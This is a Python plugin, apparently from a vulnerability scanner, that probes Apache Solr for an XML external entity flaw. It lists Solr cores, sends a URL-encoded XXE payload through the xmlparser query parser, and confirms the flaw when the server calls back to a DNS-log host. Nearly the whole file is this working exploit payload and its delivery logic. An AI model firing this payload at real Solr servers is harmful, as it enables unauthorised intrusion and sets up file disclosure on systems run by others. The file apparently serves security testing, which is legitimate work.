#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

import re
import asyncio
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.SOLR

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                dns = self.get_dnslog_url()
                for path in [self.base_url, self.base_url+"solr/"]:
                    url = path + 'admin/cores?wt=json'
                    async with session.get(url=url, allow_redirects=False) as res:
                        if res and res.status == 200:
                            text = await res.text()
                            if 'responseHeader' in text:
                                matchObj = re.search(r'"name":"(?P<core>.*?)"', text)
                                if matchObj:
                                    name = matchObj.group(1)
                                    url1 = path + name + '/select?q=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20root%20%5B%0A%3C!ENTITY%20%25%20remote%20SYSTEM%20%22{dns}%22%3E%0A%25remote%3B%5D%3E%0A%3Croot%2F%3E&wt=xml&defType=xmlparser'.format(dns=dns)
                                    async with session.get(url=url1) as res1:
                                        if res1:
                                            await asyncio.sleep(1)
                                            if await self.get_dnslog_recode(dns):
                                                yield url
                                                return